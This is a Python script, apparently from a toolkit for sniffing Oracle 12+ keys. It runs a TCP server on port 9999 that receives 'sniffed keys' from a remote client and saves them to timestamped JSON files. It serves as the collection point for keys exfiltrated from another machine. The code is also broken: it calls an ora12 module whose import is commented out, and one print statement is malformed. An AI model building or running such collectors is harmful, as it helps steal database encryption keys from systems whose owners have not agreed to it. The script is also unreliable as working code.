# Streaming Server
import socket
#import ora12_29 as ora12
import sys
import json
import os
from datetime import datetime

banner='''
############################################################
   Python  server remote sniff keys
   Technnologies:
   * Oracle 12+ keys
############################################################
'''
print(banner)

addr=("",9999)
s = socket.create_server(addr)

try:
	os.makedirs("all_keys")
except:
	pass


try:
	while True:
		conn, addr = s.accept()
		print ('Client connection accepted '), addr
		while True:
			packet = conn.recv(65565)
			if len(packet)>0:
				parola = packet.decode('utf-8',"replace").split("*")
				print(parola)
				if parola[0]=='ORACKEY':
					parola.remove(parola[0])
					try:
						parola.remove("")
					except:
						pass
					print(parola)
					while len(parola)==0:
						packet = conn.recv(65565)
						parola = packet.decode('utf-8',"replace").split("*")
						try:
							parola.remove("")
						except:
							pass
					k=[]
					for i,key_o in enumerate(parola):
						print ('ORACKEY RECEIVED:', key_o)
						if key_o =='CHIUDO':
							#print("START DECODING...")
							dictk=ora12.create_dict_okeys(k) #create a dictionary with sniffed keys
							now=datetime.now()
							date_time = now.strftime("%Y%m%d%H%M%S")
							with open("all_keys/orakey"+date_time+".json","w") as f:
								#dump the keys into json file
								json.dump(dictk,f,indent=4)
								print(f"Dumped {f.name}")
								#oki=ora12.create_class_okeys(dictk) #create class with methods to decode
								#ora12.start_search( oki,'dict')
							conn.close()
							break
						k.append(key_o)
					break
except KeyboardInterrupt:
	print(" exiting..")
	sys.exit()	
	

conn.close()